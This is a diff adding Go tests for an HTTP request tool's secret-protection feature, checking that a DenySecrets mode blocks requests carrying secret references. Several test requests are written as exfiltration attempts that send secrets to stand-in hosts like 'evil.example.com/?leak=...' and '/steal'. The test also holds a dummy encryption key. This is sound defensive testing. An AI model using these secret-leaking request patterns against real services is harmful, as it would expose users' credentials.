@@ -291,3 +291,131 @@ func jsonString(v any) string {
 	b, _ := json.Marshal(v)
 	return string(b)
 }
+
+func TestContainsSecretRef(t *testing.T) {
+	cases := []struct {
+		name string
+		in   RequestInput
+		want bool
+	}{
+		{"plain", RequestInput{URL: "https://example.com/{{var}}", Body: `{"k":"{{v}}"}`}, false},
+		{"url", RequestInput{URL: "https://evil.example/?k={{secret:stripe}}"}, true},
+		{"url spaces", RequestInput{URL: "https://evil.example/?k={{ secret:stripe }}"}, true},
+		{"param", RequestInput{URL: "https://evil.example/", Params: []KeyValue{{Key: "k", Value: "{{secret:stripe}}"}}}, true},
+		{"header", RequestInput{URL: "https://evil.example/", Headers: []KeyValue{{Key: "X-Leak", Value: "{{secret:stripe}}"}}}, true},
+		{"body", RequestInput{URL: "https://evil.example/", Body: "{{secret:stripe}}"}, true},
+		{"body form", RequestInput{URL: "https://evil.example/", BodyForm: []KeyValue{{Key: "k", Value: "{{secret:stripe}}"}}}, true},
+		{"auth bearer", RequestInput{URL: "https://evil.example/", Auth: AuthConfig{Type: AuthBearer, Token: "{{secret:stripe}}"}}, true},
+		{"auth basic", RequestInput{URL: "https://evil.example/", Auth: AuthConfig{Type: AuthBasic, Password: "{{secret:stripe}}"}}, true},
+		{"auth apikey", RequestInput{URL: "https://evil.example/", Auth: AuthConfig{Type: AuthAPIKey, APIKeyValue: "{{secret:stripe}}"}}, true},
+		{"auth oauth2", RequestInput{URL: "https://evil.example/", Auth: AuthConfig{Type: AuthOAuth2, OAuth2: &OAuth2Config{ClientSecret: "{{secret:stripe}}"}}}, true},
+	}
+	for _, tc := range cases {
+		if got := ContainsSecretRef(tc.in); got != tc.want {
+			t.Errorf("%s: ContainsSecretRef = %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
+
+func TestDenySecretsBlocksInlineAndEnvSecrets(t *testing.T) {
+	ctx := context.Background()
+	pool := testdb.New(t)
+	if _, err := seed.Run(ctx, pool, seed.Options{Demo: true}); err != nil {
+		t.Fatal(err)
+	}
+	q := store.New(pool)
+	me, _ := q.GetLocalUser(ctx)
+	ws := me.WorkspaceID
+
+	box, err := secrets.NewBox("MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=")
+	if err != nil {
+		t.Fatal(err)
+	}
+	us := &usersecrets.Service{Q: q, Box: box}
+	sec, err := us.Create(ctx, ws, me.ID, usersecrets.Input{
+		Name:         "Secret Key",
+		Value:        "top-secret-value-123",
+		Placement:    usersecrets.PlacementBearer,
+		AllowedHosts: []string{"api.allowed.example.com"},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	var calls int
+	svc := &Service{
+		Q:       q,
+		Secrets: us,
+		HTTP: roundTripFunc(func(r *http.Request) (*http.Response, error) {
+			calls++
+			return &http.Response{
+				StatusCode: http.StatusOK,
+				Status:     "200 OK",
+				Header:     http.Header{"Content-Type": []string{"application/json"}},
+				Body:       io.NopCloser(strings.NewReader(`{"ok":true}`)),
+			}, nil
+		}),
+	}
+
+	bundle, err := svc.CreateWorkspace(ctx, ws, me.ID, WorkspaceInput{
+		Name:        "Agent Test",
+		DefaultAuth: AuthConfig{Type: AuthBearer, Token: "{{api_token}}"},
+		DefaultVars: []EnvVar{
+			{Key: "base_url", Value: "https://api.allowed.example.com", Enabled: true},
+			{Key: "api_token", SecretHandle: sec.Handle, Enabled: true},
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	inlineReq, err := svc.CreateRequest(ctx, ws, bundle.Workspace.ID, RequestInput{
+		Name:   "Inline secret exfil",
+		Method: "GET",
+		URL:    "https://evil.example.com/?leak={{secret:" + sec.Handle + "}}",
+		Auth:   AuthConfig{Type: AuthNone},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	inheritedReq, err := svc.CreateRequest(ctx, ws, bundle.Workspace.ID, RequestInput{
+		Name:   "Inherited secret-backed env var",
+		Method: "GET",
+		URL:    "https://evil.example.com/steal",
+		Auth:   AuthConfig{Type: AuthInherit},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	plainReq, err := svc.CreateRequest(ctx, ws, bundle.Workspace.ID, RequestInput{
+		Name:   "Unauthenticated public call",
+		Method: "GET",
+		URL:    "{{base_url}}/health",
+		Auth:   AuthConfig{Type: AuthNone},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	for name, id := range map[string]uuid.UUID{
+		"inline":    inlineReq.ID,
+		"inherited": inheritedReq.ID,
+	} {
+		_, err := svc.RunSavedRequest(ctx, ws, me.ID, id, RunOptions{DenySecrets: true})
+		var ce *apperr.ConflictError
+		if !errors.As(err, &ce) {
+			t.Fatalf("%s: expected ConflictError with DenySecrets=true, got %v", name, err)
+		}
+	}
+	if calls != 0 {
+		t.Fatalf("expected 0 outbound HTTP calls when DenySecrets rejected requests, got %d", calls)
+	}
+
+	// Plain request in the same workspace still succeeds even though api_token is defined.
+	if _, err := svc.RunSavedRequest(ctx, ws, me.ID, plainReq.ID, RunOptions{DenySecrets: true}); err != nil {
+		t.Fatalf("plain request should succeed with DenySecrets=true: %v", err)
+	}
+	if calls != 1 {
+		t.Fatalf("expected 1 outbound HTTP call for plain request, got %d", calls)
+	}
+}
